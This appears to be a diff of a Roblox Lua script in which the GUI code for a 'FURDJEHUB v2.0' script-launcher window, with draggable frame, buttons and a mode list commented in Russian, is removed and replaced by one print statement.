-titleCorner.CornerRadius = UDim.new(0, 10)
-titleCorner.Parent = titleBar
-
-local titleText = Instance.new("TextLabel")
-titleText.Size = UDim2.new(1, -80, 1, 0)
-titleText.Position = UDim2.new(0, 15, 0, 0)
-titleText.Text = "⚡ FURDJEHUB"
-titleText.TextColor3 = Color3.fromRGB(255, 200, 50)
-titleText.TextSize = 20
-titleText.Font = Enum.Font.GothamBold
-titleText.TextXAlignment = Enum.TextXAlignment.Left
-titleText.BackgroundTransparency = 1
-titleText.Parent = titleBar
-
--- Кнопка закрытия
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0, 35, 0, 35)
-closeBtn.Position = UDim2.new(1, -40, 0, 5)
-closeBtn.Text = "✕"
-closeBtn.TextSize = 16
-closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
-closeBtn.BorderSizePixel = 0
-closeBtn.Parent = titleBar
-
-local closeCorner = Instance.new("UICorner")
-closeCorner.CornerRadius = UDim.new(0, 6)
-closeCorner.Parent = closeBtn
-
-closeBtn.MouseEnter:Connect(function()
-    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
-end)
-closeBtn.MouseLeave:Connect(function()
-    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
-end)
-
-closeBtn.MouseButton1Click:Connect(function()
-    screenGui:Destroy()
-end)
-
--- Кнопка сворачивания
-local toggleBtn = Instance.new("TextButton")
-toggleBtn.Size = UDim2.new(0, 50, 0, 50)
-toggleBtn.Position = UDim2.new(0, 15, 0, 15)
-toggleBtn.Text = "⚡"
-toggleBtn.TextSize = 22
-toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-toggleBtn.BorderSizePixel = 0
-toggleBtn.Parent = screenGui
-toggleBtn.Visible = true
-toggleBtn.Selectable = false
-
-local toggleCorner = Instance.new("UICorner")
-toggleCorner.CornerRadius = UDim.new(0, 10)
-toggleCorner.Parent = toggleBtn
-
-toggleBtn.MouseButton1Click:Connect(function()
-    window.Visible = not window.Visible
-end)
-
--- Drag для заголовка
-titleBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        dragOffset = window.Position
-    end
-end)
-
-titleBar.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = false
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-        local delta = input.Position - dragStart
-        window.Position = UDim2.new(dragOffset.X.Scale, dragOffset.X.Offset + delta.X, dragOffset.Y.Scale, dragOffset.Y.Offset + delta.Y)
-    end
-end)
-
--- Контент
-local content = Instance.new("Frame")
-content.Size = UDim2.new(1, -20, 1, -60)
-content.Position = UDim2.new(0, 10, 0, 55)
-content.BackgroundTransparency = 1
-content.Parent = window
-
--- Скроллинг
-local scrollFrame = Instance.new("ScrollingFrame")
-scrollFrame.Size = UDim2.new(1, 0, 1, 0)
-scrollFrame.BackgroundTransparency = 1
-scrollFrame.ScrollBarThickness = 6
-scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 85)
-scrollFrame.BorderSizePixel = 0
-scrollFrame.Parent = content
-
-local canvas = Instance.new("Frame")
-canvas.Size = UDim2.new(1, 0, 0, 0)
-canvas.BackgroundTransparency = 1
-canvas.Parent = scrollFrame
-
-local canvasY = 5
-
--- ===== СОЗДАНИЕ КНОПОК РЕЖИМОВ =====
-local function createModeButton(mode, index)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, -10, 0, 60)
-    btn.Position = UDim2.new(0, 5, 0, canvasY)
-    btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    btn.BorderSizePixel = 0
-    btn.Parent = canvas
-    btn.Selectable = false
-    
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 8)
-    btnCorner.Parent = btn
-    
-    -- Название
-    local nameLabel = Instance.new("TextLabel")
-    nameLabel.Size = UDim2.new(1, -20, 0.5, 0)
-    nameLabel.Position = UDim2.new(0, 10, 0, 5)
-    nameLabel.Text = mode.Name
-    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    nameLabel.TextSize = 16
-    nameLabel.Font = Enum.Font.GothamBold
-    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.Parent = btn
-    
-    -- Описание
-    local descLabel = Instance.new("TextLabel")
-    descLabel.Size = UDim2.new(1, -20, 0.5, 0)
-    descLabel.Position = UDim2.new(0, 10, 0.5, 0)
-    descLabel.Text = mode.Description
-    descLabel.TextColor3 = Color3.fromRGB(150, 150, 180)
-    descLabel.TextSize = 12
-    descLabel.Font = Enum.Font.Gotham
-    descLabel.TextXAlignment = Enum.TextXAlignment.Left
-    descLabel.BackgroundTransparency = 1
-    descLabel.Parent = btn
-    
-    -- Кнопка запуска
-    local launchBtn = Instance.new("TextButton")
-    launchBtn.Size = UDim2.new(0, 90, 0, 32)
-    launchBtn.Position = UDim2.new(1, -100, 0.5, -16)
-    launchBtn.Text = "▶ ЗАПУСК"
-    launchBtn.TextSize = 12
-    launchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    launchBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 70)
-    launchBtn.BorderSizePixel = 0
-    launchBtn.Parent = btn
-    launchBtn.Selectable = false
-    
-    local launchCorner = Instance.new("UICorner")
-    launchCorner.CornerRadius = UDim.new(0, 6)
-    launchCorner.Parent = launchBtn
-    
-    -- Статус
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(0, 80, 0, 20)
-    statusLabel.Position = UDim2.new(1, -190, 0.5, -10)
-    statusLabel.Text = "●"
-    statusLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
-    statusLabel.TextSize = 20
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.Font = Enum.Font.Gotham
-    statusLabel.Parent = btn
-    
-    -- Ховер эффект
-    btn.MouseEnter:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(45, 45, 70)
-    end)
-    btn.MouseLeave:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    end)
-    
-    -- Запуск
-    launchBtn.MouseButton1Click:Connect(function()
-        statusLabel.Text = "● ЗАГРУЗКА..."
-        statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
-        
-        if mode.Script and mode.Script ~= "" then
-            screenGui:Destroy()
-            loadScript(mode.Script)
-        else
-            statusLabel.Text = "● НЕТ СКРИПТА"
-            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-            showNotification("⚠️ Скрипт для " .. mode.Name .. " не добавлен!", Color3.fromRGB(200, 150, 40))
-            task.wait(1.5)
-            statusLabel.Text = "●"
-            statusLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
-        end
-    end)
-    
-    canvasY = canvasY + 70
-    canvas.Size = UDim2.new(1, 0, 0, canvasY)
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, canvasY + 10)
-    
-    return btn
-end
-
--- Создаем кнопки для всех режимов
-for i, mode in ipairs(Modes) do
-    createModeButton(mode, i)
-end
-
--- Информация внизу
-local footer = Instance.new("TextLabel")
-footer.Size = UDim2.new(1, -20, 0, 20)
-footer.Position = UDim2.new(0, 10, 1, -30)
-footer.Text = "FURDJEHUB v2.0 | Выбери режим и нажми ▶ ЗАПУСК"
-footer.TextColor3 = Color3.fromRGB(100, 100, 130)
-footer.TextSize = 11
-footer.BackgroundTransparency = 1
-footer.Font = Enum.Font.Gotham
-footer.Parent = content
-
-print("⚡ FURDJEHUB Launcher v2.0 loaded!")
-print("📌 Всего режимов: " .. #Modes)
-print("💡 Нажми ▶ ЗАПУСК для загрузки скрипта")
+print("⚡ FURDJEHUB Launcher загружен")
